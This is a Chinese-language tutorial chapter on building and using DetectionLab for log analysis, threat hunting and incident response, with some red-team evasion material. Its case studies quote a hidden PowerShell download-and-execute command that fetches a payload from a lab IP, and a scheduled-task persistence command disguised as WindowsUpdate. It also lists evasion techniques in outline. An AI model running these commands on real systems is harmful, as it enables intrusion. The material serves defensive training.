# 靶场16：DetectionLab

---

## 基本信息

- **难度等级**：🔴 特级
- **预计学习时间**：180分钟
- **学习目标**：
  1. 了解 DetectionLab 的架构和用途
  2. 掌握 DetectionLab 的搭建方法
  3. 学会使用 DetectionLab 中的安全工具
  4. 能够从蓝队和红队双视角进行安全练习
  5. 掌握日志分析、入侵检测、威胁狩猎等蓝队技能

---

## 一、DetectionLab 介绍

DetectionLab 是一个专门用于安全检测和响应的实验室环境，由安全研究员 Chris Long 创建并维护。它的核心理念是提供一个"开箱即用"的企业级安全检测环境，让安全从业者能够在一个高度仿真的环境中练习蓝队技能。

### 1.1 什么是 DetectionLab

DetectionLab 是一套自动化构建的检测实验室，它通过 Vagrant + Packer + VirtualBox/VMware 的组合，在数小时内自动搭建出一个完整的 Active Directory 域环境，并预先配置好各种安全监控工具。

简单来说，DetectionLab 就是一个"装好的安全实验室"——你不需要手动一台台装系统、配域、装监控工具，只需要运行几条命令，就能得到一个完整的检测环境。

### 1.2 DetectionLab 的核心价值

- **快速搭建**：自动化部署，几小时即可完成
- **环境真实**：完整的 Windows 域环境，模拟真实企业网络
- **工具齐全**：预装 Splunk、Sysmon、Atomic Red Team 等工具
- **蓝队友好**：专注于检测和响应，而非单纯的攻击
- **持续更新**：社区活跃，工具和配置不断更新

---

## 二、DetectionLab 与 GOAD 的区别

很多人会把 DetectionLab 和 GOAD（Game of Active Directory）混淆，因为它们都是基于 Active Directory 的靶场环境。但实际上，两者的定位和侧重点有很大不同。

| 对比维度 | DetectionLab | GOAD |
|---------|-------------|------|
| **核心视角** | 蓝队（检测与响应） | 红队（攻击与渗透） |
| **主要用途** | 日志分析、入侵检测、威胁狩猎 | 域渗透、权限提升、横向移动 |
| **预装工具** | Splunk、Sysmon、Velociraptor、EDR | 漏洞环境、脆弱配置 |
| **环境设计** | 有安全防护，需要绕过检测 | 有大量漏洞，专注利用 |
| **学习目标** | 学会发现攻击、响应事件 | 学会攻击方法、利用漏洞 |
| **练习方式** | 攻击后分析日志、检测告警 | 直接攻击获取权限 |

**一句话总结**：GOAD 是让你练习"怎么打进去"，DetectionLab 是让你练习"怎么发现别人打进来了"。

当然，DetectionLab 也完全可以用来做红队练习——你可以尝试在有监控的环境下进行攻击，学习如何规避检测、绕过 EDR，这也是非常有价值的训练。

> 💡 **深入理解：红队为什么必须懂蓝队？——"小偷必须懂安保"的道理**
>
> 很多学红队的人有这样一个误区："我只管攻，防是蓝队的事。"
> 这是极其危险的想法。真实情况是：**不懂蓝队的红队，在实战中活不过第一天。**
>
> 用偷东西的比喻来理解为什么红队必须懂检测：
>
> ```
> 不懂检测的红队（99%的新手）：
> "我看到一个SQL注入 → 直接用sqlmap跑 → 拿到了数据库"
>        ↓
> 10分钟后蓝队收到告警："检测到SQLMap特征流量，源IP已封禁"
>        ↓
> 你的Shell断了，你的IP被封了，你的行动暴露了
>        ↓
> 游戏结束，你连自己怎么暴露的都不知道！
>
> 懂检测的红队：
> "我看到一个SQL注入 → 但我不会用sqlmap！
>  我要手工注入，控制流量速度，避开WAF特征"
>        ↓
> 蓝队SIEM里这条流量混在上千条正常流量里，根本看不出来
>        ↓
> 你已经在内网逛了3天，蓝队还在检查"这个IP为什么多了点流量"
> ```
>
> **DetectionLab的价值就在于此**：
> 它在靶场里给你配了Splunk（蓝队监控），你可以：
> 1. 先攻击 → 然后立马切到Splunk看"我刚才的操作产生了什么日志"
> 2. 你会发现：用sqlmap = 在日志里留了一串特征签名
> 3. 你会发现：用nmap做全端口扫描 = 几百条告警
> 4. 然后你学会：分段扫描、控制速率、使用非默认参数
>
> 这就是"知己知彼"的真正含义——**不是知道蓝队有什么工具，
> 而是知道你每个攻击动作在对方监控里长什么样！**

---

## 三、环境架构

DetectionLab 的环境架构设计非常贴近真实企业环境，包含了域控、成员服务器、客户端以及完整的日志收集系统。

### 3.1 整体架构图

```
┌─────────────────────────────────────────────────────────────┐
│                     DetectionLab 网络                        │
│                                                             │
│  ┌──────────┐    ┌──────────────┐    ┌──────────────────┐  │
│  │  Windows  │    │  Windows      │    │   Windows 10     │  │
│  │  Server    │    │  Server       │    │   客户端         │  │
│  │  (域控DC)  │    │  (成员服务器)   │    │   (用户终端)     │  │
│  │  + AD      │    │  + Exchange   │    │   + Office       │  │
│  │  + DNS     │    │  + IIS        │    │   + Chrome       │  │
│  │  + DHCP    │    │  + 各种服务    │    │   + Sysmon       │  │
│  │  + Sysmon  │    │  + Sysmon     │    │                  │  │
│  └─────┬──────┘    └──────┬───────┘    └────────┬─────────┘  │
│        │                  │                     │            │
│        └──────────────────┼─────────────────────┘            │
│                           │                                  │
│                    日志转发（Winlogbeat）                      │
│                           │                                  │
│                  ┌────────▼─────────┐                       │
│                  │   日志收集系统    │                       │
│                  │   (Splunk/ELK)   │                       │
│                  │   + 安全分析      │                       │
│                  └──────────────────┘                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 3.2 核心组件详解

> 💡 **深入理解：Splunk到底是怎么帮你"看到攻击"的？——日志分析的"CT扫描"**
>
> DetectionLab最核心的价值不是"有域环境"（GOAD也有），
> 而是**预装了完整的日志收集+分析体系**。
> 很多人搭了环境却不知道这套体系怎么运转的，这里通俗解释：
>
> 整个检测体系就像医院的体检流程：
> ```
> 第一步：数据产生（像身体各器官在运转）
>   → Windows事件日志：系统自带的"基础体检"
>   → Sysmon：更精细的"专家会诊"（记录进程创建、网络连接等细节）
>   → 每个操作都在产生"健康数据"
>
> 第二步：数据收集（像抽血、量体温、做CT）
>   → Winlogbeat：安装在每台机器上的"采血针"
>   → 把Windows事件日志和Sysmon日志采集起来
>   → 统一发送到中央处理器
>
> 第三步：数据存储和索引（像把所有检验报告归档）
>   → Splunk接收所有机器的日志
>   → 建立索引（按时间、事件类型、机器名等）
>   → 就像把所有体检报告分门别类放好
>
> 第四步：数据分析（像医生看报告）
>   → Splunk的SPL查询语言 = 医生的诊断工具
>   → "把过去24小时所有失败登录拉出来看看"
>   → "有没有哪个IP在1小时内连了50台机器？"
>   → 从海量数据中找到异常模式 = 医生从CT片中发现病灶
> ```
>
> **这就是蓝队工作的本质**：不是"盯着屏幕看攻击者进来了没有"，
> 而是**在海量日志中用查询语言找出异常模式**。
>
> 打个比方，你不可能24小时盯着大楼的每个角落看，
> 但你可以在事后查监控录像："昨晚2:00-4:00谁进过机房？"
> Splunk就是这个"监控录像检索系统"。

#### （1）域控（Windows Server + AD）

- **操作系统**：Windows Server 2016/2019/2022
- **角色**：Active Directory 域服务、DNS、DHCP
- **配置**：
  - 完整的域环境（如 windomain.local）
  - 多个用户账号、组、OU 结构
  - 组策略配置
  - Sysmon 系统监控
  - Windows Event Log 增强日志

#### （2）成员服务器

- **操作系统**：Windows Server 2016/2019
- **角色**：文件服务器、Web 服务器、Exchange 等
- **配置**：
  - 加入域环境
  - 各种业务服务
  - Sysmon 监控
  - 共享文件夹

#### （3）Windows 10 客户端

- **操作系统**：Windows 10 企业版
- **角色**：模拟员工终端
- **配置**：
  - 加入域环境
  - Office 办公软件
  - 浏览器等常用软件
  - Sysmon 监控
  - 模拟用户行为

#### （4）日志收集系统

DetectionLab 支持两种日志收集方案：

**方案一：Splunk（默认推荐）**
- Splunk Enterprise 试用版
- 预装 Windows 安全事件、Sysmon 日志
- 预置检测查询和仪表盘
- 支持 CIM（Common Information Model）数据模型

**方案二：ELK Stack**
- Elasticsearch + Logstash + Kibana
- Winlogbeat 日志转发
- 预配置可视化仪表盘

#### （5）EDR/安全产品

DetectionLab 可以集成多种安全产品：
- **Sysmon**：系统监控，记录进程创建、网络连接、文件操作等
- **Velociraptor**：数字取证和应急响应工具
- **Atomic Red Team**：攻击模拟测试框架
- **Caldera**：MITRE ATT&CK 自动化攻击框架
- （可选）商业 EDR 产品

---

## 四、环境搭建

DetectionLab 支持多种虚拟化平台，搭建过程相对自动化，但对硬件要求较高。

### 4.1 硬件要求

| 配置项 | 最低要求 | 推荐配置 |
|-------|---------|---------|
| **CPU** | 4核 | 8核以上 |
| **内存** | 16GB | 32GB以上 |
| **磁盘** | 100GB 可用空间 | 200GB SSD |
| **系统** | Windows/Linux/macOS | Windows 10/11 或 Ubuntu |

### 4.2 软件准备

搭建 DetectionLab 需要以下软件：

1. **虚拟机软件**：VirtualBox（免费）或 VMware Workstation/Fusion
2. **Vagrant**：自动化虚拟机管理工具
3. **Packer**：镜像构建工具（可选，用于自定义镜像）
4. **Git**：克隆 DetectionLab 仓库

### 4.3 搭建步骤详解

#### 步骤一：安装基础软件

```bash
# 1. 安装 VirtualBox（以 Ubuntu 为例）
sudo apt install virtualbox

# 2. 安装 Vagrant
wget https://releases.hashicorp.com/vagrant/2.4.0/vagrant_2.4.0_linux_amd64.zip
unzip vagrant_2.4.0_linux_amd64.zip
sudo mv vagrant /usr/local/bin/

# 3. 安装 Packer（可选）
wget https://releases.hashicorp.com/packer/1.10.0/packer_1.10.0_linux_amd64.zip
unzip packer_1.10.0_linux_amd64.zip
sudo mv packer /usr/local/bin/
```

#### 步骤二：克隆 DetectionLab 仓库

```bash
git clone https://github.com/clong/DetectionLab.git
cd DetectionLab
```

#### 步骤三：配置环境

编辑配置文件，选择适合的配置：

```bash
# 查看可用的配置选项
ls Vagrant/

# 根据你的虚拟化平台选择
# VirtualBox: Vagrant/VirtualBox
# VMware: Vagrant/VMware
```

#### 步骤四：构建基础镜像（可选）

如果你想自己构建镜像，可以使用 Packer：

```bash
cd Packer
# 构建 Windows 镜像
packer build windows_2019.json
```

> 注意：构建镜像需要较长时间（1-2小时），也可以直接使用官方提供的 Vagrant Box。

#### 步骤五：启动 DetectionLab

```bash
cd ../Vagrant/VirtualBox  # 或 VMware

# 启动所有虚拟机（需要较长时间）
vagrant up

# 查看虚拟机状态
vagrant status
```

#### 步骤六：验证环境

启动完成后，验证各组件是否正常：

```bash
# 访问 Splunk
# 浏览器打开 https://192.168.38.105:8000
# 默认账号：admin / changeme

# 登录域控
vagrant ssh dc

# 登录 Windows 10 客户端
vagrant ssh wef
```

### 4.4 常见问题排查

| 问题 | 可能原因 | 解决方法 |
|------|---------|---------|
| 虚拟机启动失败 | 硬件虚拟化未开启 | BIOS 中开启 VT-x/AMD-V |
| 内存不足 | 分配内存过多 | 减少每台虚拟机的内存 |
| 网络不通 | 虚拟网卡配置问题 | 检查 VirtualBox 网络设置 |
| 搭建中断 | 网络下载失败 | 重新运行 vagrant up |
| Splunk 无法访问 | 服务未启动 | 手动启动 Splunk 服务 |

---

## 五、DetectionLab 包含的安全工具

DetectionLab 最大的价值在于它预装了各种安全工具，让你可以直接开始练习。

### 5.1 Splunk 日志分析

Splunk 是业界领先的日志分析平台，DetectionLab 中预装了 Splunk Enterprise 试用版。

**主要功能**：
- 收集所有 Windows 主机的安全事件日志
- 收集 Sysmon 详细监控日志
- 预置安全仪表盘和检测规则
- 支持 SPL（Splunk Processing Language）查询

**常用 SPL 查询示例**：

```spl
# 查看所有登录失败事件
index=winlogbeat EventCode=4625
| stats count by TargetUserName, IpAddress

# 查看进程创建事件（Sysmon EventID 1）
index=sysmon EventID=1
| table _time, ComputerName, Image, CommandLine
| sort -_time

# 查看网络连接
index=sysmon EventID=3
| where DestinationPort != 0
| stats count by DestinationIp, DestinationPort
| sort -count
```

### 5.2 Sysmon 系统监控

Sysmon（System Monitor）是微软 Sysinternals 工具集中的一款系统监控工具，能够记录系统中各种详细的安全相关事件。

**Sysmon 监控的事件类型**：

| EventID | 事件类型 | 说明 |
|---------|---------|------|
| 1 | ProcessCreate | 进程创建 |
| 2 | FileCreationTime | 文件创建时间修改 |
| 3 | NetworkConnect | 网络连接 |
| 5 | ProcessTerminate | 进程终止 |
| 6 | DriverLoad | 驱动加载 |
| 7 | ImageLoad | 镜像加载（DLL） |
| 8 | CreateRemoteThread | 远程线程创建 |
| 9 | RawAccessRead | 原始磁盘读取 |
| 10 | ProcessAccess | 进程访问 |
| 11 | FileCreate | 文件创建 |
| 12 | RegEvent | 注册表对象创建/删除 |
| 13 | RegEvent | 注册表值设置 |
| 14 | RegEvent | 注册表键/值重命名 |
| 15 | FileCreateStreamHash | 文件流创建 |
| 16 | ServiceConfigurationChange | Sysmon 配置更改 |
| 17 | PipeEvent | 命名管道创建 |
| 18 | PipeEvent | 命名管道连接 |
| 19 | WmiEvent | WMI 事件过滤器 |
| 20 | WmiEvent | WMI 消费者 |
| 21 | WmiEvent | WMI 消费者过滤器绑定 |
| 22 | DnsQuery | DNS 查询 |
| 23 | FileDelete | 文件删除 |
| 25 | ProcessTampering | 进程篡改 |
| 26 | FileDeleteDetected | 文件删除检测 |

**Sysmon 配置文件**：DetectionLab 使用的是 SwiftOnSecurity 或 Olaf Hartong 的 Sysmon 配置，这些配置经过优化，能够有效捕获安全相关事件，同时控制日志量。

### 5.3 Atomic Red Team 测试

Atomic Red Team 是一个基于 MITRE ATT&CK 框架的攻击测试库，提供了数百个简单的测试用例，用于验证安全检测能力。

**使用方法**：

```powershell
# 在 Windows 主机上安装 Atomic Red Team
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics

# 查看可用的测试
Invoke-AtomicTest All -ShowDetailsBrief

# 执行特定技术的测试（T1059.001 - PowerShell）
Invoke-AtomicTest T1059.001 -TestNumbers 1

# 执行所有测试（谨慎使用）
Invoke-AtomicTest All
```

**Atomic Red Team 的价值**：
- 提供标准化的攻击测试用例
- 每个测试都对应 MITRE ATT&CK 技术编号
- 可以验证检测规则是否有效
- 简单易用，适合测试和学习

### 5.4 Caldera 自动化攻击

Caldera 是 MITRE 开发的自动化攻击框架，基于 ATT&CK 框架，可以自动执行红队操作。

**主要特点**：
- 自动化攻击链执行
- 支持多种攻击技术
- 可视化操作界面
- 可扩展的插件系统

**使用场景**：
- 自动化红队演练
- 检测规则有效性验证
- 安全产品测试
- 防御能力评估

### 5.5 Velociraptor 取证

Velociraptor 是一款开源的数字取证和应急响应工具，能够快速收集和分析终端数据。

**主要功能**：
- 远程文件收集
- 进程分析
- 注册表分析
- 网络连接分析
- 内存分析（集成 Volatility）
- artifact 收集

**典型应用**：
- 入侵事件快速响应
- 终端安全状态检查
- 威胁狩猎
- 合规检查

---

## 六、蓝队视角练习

DetectionLab 最核心的价值在于蓝队视角的练习。下面介绍几种常见的蓝队练习方式。

### 6.1 日志分析练习

**练习目标**：学会从海量日志中发现可疑行为

**练习方法**：
1. 在 Splunk 中浏览各种日志数据
2. 学习识别正常行为和异常行为
3. 使用 SPL 查询进行数据筛选和统计
4. 创建自定义仪表盘

**练习要点**：
- 熟悉 Windows 安全事件日志（Event ID 4624/4625/4672 等）
- 熟悉 Sysmon 各事件类型
- 学习使用统计和可视化发现异常
- 掌握时间线分析方法

### 6.2 入侵检测练习

**练习目标**：能够检测到常见的攻击行为

**练习方法**：
1. 使用 Atomic Red Team 执行攻击测试
2. 在 Splunk 中搜索对应的日志
3. 编写检测规则
4. 验证检测效果

**常见检测场景**：

| 攻击技术 | 检测方法 | 关键日志 |
|---------|---------|---------|
| PowerShell 攻击 | 检测可疑 PowerShell 命令行 | Sysmon EventID 1 |
| Pass-the-Hash | 检测 NTLM 登录异常 | 安全日志 4624 |
| 横向移动 | 检测异常远程连接 | 安全日志 4624 + Sysmon |
| 权限提升 | 检测服务安装/修改 | 系统日志 7045 |
| 持久化 | 检测注册表启动项 | Sysmon EventID 12/13 |
| 数据外泄 | 检测异常网络连接 | Sysmon EventID 3 |

### 6.3 应急响应练习

**练习目标**：掌握入侵事件的响应流程

**练习流程**：

1. **发现阶段**：从告警或异常日志中发现入侵
2. **遏制阶段**：隔离受感染主机，阻止攻击扩散
3. **根除阶段**：清除恶意软件、后门、持久化机制
4. **恢复阶段**：恢复系统正常运行
5. **总结阶段**：分析攻击路径，完善防护措施

**练习工具**：
- Velociraptor：快速收集取证数据
- Splunk：日志分析和时间线重建
- Sysmon：详细行为记录

### 6.4 威胁狩猎练习

**练习目标**：主动发现环境中的潜在威胁

**狩猎方法**：

1. **假设驱动狩猎**：基于威胁情报，假设某种攻击存在，主动搜索
2. **异常驱动狩猎**：从异常行为入手，深入调查
3. **数据驱动狩猎**：通过数据分析发现模式异常

**常见狩猎场景**：
- 异常的 PowerShell 使用
- 可疑的计划任务
- 异常的服务安装
- 罕见的网络连接
- 异常的登录模式

---

## 七、红队视角练习

除了蓝队练习，DetectionLab 也非常适合红队在"有监控"的环境下练习攻击技术。

### 7.1 攻击检测与绕过

**练习目标**：了解攻击行为会留下什么痕迹，以及如何减少痕迹

**练习方法**：
1. 在环境中执行攻击操作
2. 立即在 Splunk 中查看生成了哪些日志
3. 分析哪些日志可以被用来检测你的攻击
4. 尝试修改攻击方法，减少日志痕迹

**练习价值**：
- 理解攻击和检测的对抗关系
- 学习攻击者的规避思路
- 提升检测规则的编写能力（知己知彼）

### 7.2 日志规避

**常见日志规避技术**：

| 技术 | 说明 | 检测难度 |
|------|------|---------|
| 命令混淆 | 对 PowerShell/cmd 命令进行编码、混淆 | 中 |
| 直接系统调用 | 绕过用户态 API Hook | 高 |
| 白名单利用 | 使用合法程序执行恶意操作 | 中高 |
| 无文件攻击 | 完全在内存中执行，不落地文件 | 高 |
| 凭证窃取规避 | 使用非传统方式获取凭证 | 高 |

### 7.3 免杀对抗

DetectionLab 可以用来测试和练习免杀技术：

- 测试不同的 Shellcode 加载方式
- 验证加密/混淆对检测的影响
- 研究 EDR 的检测原理
- 练习自定义 Payload 开发

> **注意**：免杀技术的学习应该用于合法的安全研究和防护能力提升，严禁用于非法用途。

---

## 八、实战案例

### 案例一：DetectionLab 搭建实战

**背景**：小王是一名安全工程师，想要搭建一个 DetectionLab 环境用于蓝队技术研究。

**环境准备**：
- 主机配置：i7-10700K + 32GB 内存 + 512GB SSD
- 系统：Ubuntu 22.04
- 虚拟化：VirtualBox 7.0

**搭建过程**：

1. **安装依赖软件**
```bash
# 安装 VirtualBox
sudo apt update && sudo apt install virtualbox -y

# 安装 Vagrant
curl -O https://releases.hashicorp.com/vagrant/2.4.0/vagrant_2.4.0_linux_amd64.zip
unzip vagrant_2.4.0_linux_amd64.zip
sudo install vagrant /usr/local/bin/
```

2. **克隆仓库并启动**
```bash
git clone https://github.com/clong/DetectionLab.git
cd DetectionLab/Vagrant/VirtualBox

# 启动（预计需要 1-2 小时）
vagrant up
```

3. **验证环境**
```
# 访问 Splunk: https://192.168.38.105:8000
# 账号: admin / changeme
```

**遇到的问题和解决**：
- 问题：内存不足导致虚拟机启动失败
- 解决：编辑 Vagrantfile，将 DC 的内存从 4GB 降到 3GB
- 问题：下载 Box 速度慢
- 解决：使用国内镜像源下载

**最终结果**：成功搭建 DetectionLab 环境，可以开始蓝队练习。

---

### 案例二：Sysmon 日志分析实战

**背景**：安全分析师小李接到告警，说有一台客户端可能执行了恶意 PowerShell 脚本，需要进行调查。

**调查过程**：

1. **初步排查**：在 Splunk 中搜索 PowerShell 相关日志

```spl
index=sysmon EventID=1 Image="*powershell.exe"
| table _time, ComputerName, CommandLine, ParentImage
| sort -_time
```

2. **发现可疑命令**：搜索结果中发现一条可疑的 PowerShell 命令：
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.38.100/payload.ps1'))"
```

3. **深入分析**：

```spl
# 查看该进程的父进程
index=sysmon EventID=1 ProcessId=<父进程PID>
| table Image, CommandLine

# 查看相关的网络连接
index=sysmon EventID=3 Image="*powershell.exe"
| where DestinationIp="192.168.38.100"
| table _time, DestinationIp, DestinationPort

# 查看是否有文件落地
index=sysmon EventID=11
| where Image="*powershell.exe"
| table TargetFilename
```

4. **时间线重建**：
```
10:23:15 - 用户收到钓鱼邮件
10:23:45 - 用户点击邮件附件（恶意 Office 文档）
10:23:47 - Word 启动 powershell.exe（宏执行）
10:23:48 - PowerShell 下载远程 payload
10:23:50 - payload 执行，创建计划任务持久化
10:24:05 - 开始横向移动探测
```

**结论**：确认这是一起钓鱼邮件导致的入侵事件，攻击者通过宏执行 PowerShell 下载恶意代码，已建立持久化并开始横向移动。

---

### 案例三：Atomic Red Team 测试实战

**背景**：安全团队想要验证当前的检测规则能否覆盖 MITRE ATT&CK T1059（命令和脚本解释器）技术。

**测试计划**：
1. 选择 T1059 技术下的子技术进行测试
2. 逐个执行 Atomic Red Team 测试用例
3. 在 Splunk 中检查是否有对应告警
4. 记录覆盖情况，补充缺失的检测规则

**测试执行**：

```powershell
# 安装 Atomic Red Team
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics

# 查看 T1059 相关测试
Invoke-AtomicTest T1059 -ShowDetails

# 执行 PowerShell 测试（T1059.001）
Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3
```

**测试结果统计**：

| 技术编号 | 技术名称 | 测试数量 | 已检测 | 未检测 | 覆盖率 |
|---------|---------|---------|--------|--------|-------|
| T1059.001 | PowerShell | 15 | 10 | 5 | 67% |
| T1059.003 | Windows Command Shell | 8 | 6 | 2 | 75% |
| T1059.005 | Visual Basic | 5 | 3 | 2 | 60% |

**改进措施**：
1. 补充 PowerShell 混淆命令的检测规则
2. 增加 VBA 宏执行的监控
3. 完善命令行特征库

---

### 案例四：威胁狩猎练习实战

**背景**：安全团队开展每周威胁狩猎活动，本周主题是"可疑的计划任务"。

**狩猎思路**：
1. 收集环境中所有计划任务创建事件
2. 排除已知的正常计划任务
3. 对剩余的可疑任务进行深入分析

**狩猎过程**：

1. **查询计划任务创建事件**

```spl
index=sysmon EventID=1 
| where CommandLine LIKE "%schtasks%/create%" OR CommandLine LIKE "%New-ScheduledTask%"
| table _time, ComputerName, UserName, CommandLine
| sort -_time
```

2. **发现可疑任务**：
```
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c powershell -nop -w hidden -c IEX(...) /sc minute /mo 30
```

3. **深入调查**：
- 该任务名称伪装成 WindowsUpdate，但执行的是可疑 PowerShell 命令
- 创建时间在凌晨 2:15，非工作时间
- 创建该任务的用户是普通域用户

4. **扩大搜索范围**：

```spl
# 搜索该用户的所有活动
index=* UserName="jdoe"
| stats count by EventCode, ComputerName

# 搜索该主机的其他可疑行为
index=sysmon ComputerName="WIN10-001"
| where _time > "2024-01-15T02:00:00" AND _time < "2024-01-15T03:00:00"
| stats count by EventID, Image
```

5. **完整攻击链还原**：
- 初始访问：钓鱼邮件 + 宏
- 执行：PowerShell 下载 payload
- 持久化：计划任务
- 发现：使用 net.exe 进行网络探测
- 横向移动：尝试使用获取的凭证登录其他主机

**狩猎成果**：发现了一起未被告警发现的入侵事件，及时进行了处置。

---

### 案例五：应急响应演练实战

**背景**：公司安全团队进行季度应急响应演练，模拟勒索病毒攻击场景。

**演练场景**：
- 凌晨 3 点，监控系统告警：多台服务器出现大量文件加密行为
- 安全团队需要在 2 小时内完成初步响应

**演练过程**：

**第 1 步：确认事件（0-10 分钟）**
- 值班人员收到告警，确认 3 台服务器出现异常
- 文件被重命名为 .encrypted 后缀
- 桌面出现勒索信 README.txt

**第 2 步：遏制阶段（10-30 分钟）**
- 立即隔离受感染服务器（断开网络）
- 禁用被入侵的用户账号
- 通知 IT 团队和管理层

**第 3 步：调查阶段（30-90 分钟）**

使用 Velociraptor 收集取证数据：

```powershell
# 收集进程列表
velociraptor.exe -v artifacts.list

# 收集网络连接
velociraptor.exe artifacts collect Windows.Network.Netstat

# 收集计划任务
velociraptor.exe artifacts collect Windows.System.TaskScheduler

# 收集最近修改的文件
velociraptor.exe artifacts collect Windows.Timeline.MFT
```

在 Splunk 中分析日志：
```spl
# 查找首次感染时间
index=sysmon EventID=11 TargetFilename="*.encrypted"
| stats min(_time) as first_seen by ComputerName

# 分析攻击入口
index=* ComputerName="FILE-001"
| where _time < first_seen_time
| sort _time
```

**第 4 步：根除与恢复（90-120 分钟）**
- 清除恶意软件和持久化机制
- 从备份恢复数据
- 重置所有可能泄露的密码
- 逐步恢复网络连接

**第 5 步：总结复盘**
- 攻击入口：RDP 弱口令被暴力破解
- 扩散方式：使用 Mimikatz 获取凭证后横向移动
- 改进措施：加强 RDP 防护、部署 MFA、提升备份频率

---

## 九、练习题

### 基础题

1. **DetectionLab 的核心定位是什么？它与 GOAD 的主要区别在哪里？**

2. **DetectionLab 环境中包含哪些核心组件？请至少列举 5 个。**

3. **Sysmon 的 EventID 1、3、11 分别代表什么事件类型？**

4. **搭建 DetectionLab 需要哪些基础软件？**

5. **Atomic Red Team 的主要用途是什么？它基于什么框架？**

### 进阶题

6. **请描述蓝队视角下，如何使用 DetectionLab 进行一次完整的威胁狩猎练习。**

7. **在 DetectionLab 中，发现一台主机执行了可疑的 PowerShell 命令，请写出你的调查步骤和相应的 Splunk 查询语句（至少 3 条）。**

8. **什么是 MITRE ATT&CK 框架？它与 DetectionLab 中的工具有什么关系？**

9. **请对比 Splunk 和 ELK 两种日志收集方案的优缺点。**

10. **如果你是一名红队人员，在 DetectionLab 这样有完整监控的环境中，你会如何练习攻击技术？请从检测绕过的角度说明。**

---

## 安全提醒

> 🔔 **重要提示**
> 
> 1. DetectionLab 中的所有攻击技术和工具仅用于合法的安全研究和学习目的，严禁在未经授权的环境中使用。
> 2. 搭建 DetectionLab 需要较高的系统资源，请确保你的主机配置满足要求，避免影响正常工作。
> 3. 不要将 DetectionLab 环境直接暴露在公网上，应使用隔离的虚拟网络。
> 4. 在练习免杀和绕过技术时，请遵守当地法律法规，仅在自己的实验环境中进行。
> 5. Atomic Red Team 的测试用例可能会对系统造成影响，执行前请确保做好快照备份。
> 6. 学习检测技术的最终目的是提升防护能力，不要将所学知识用于非法攻击。
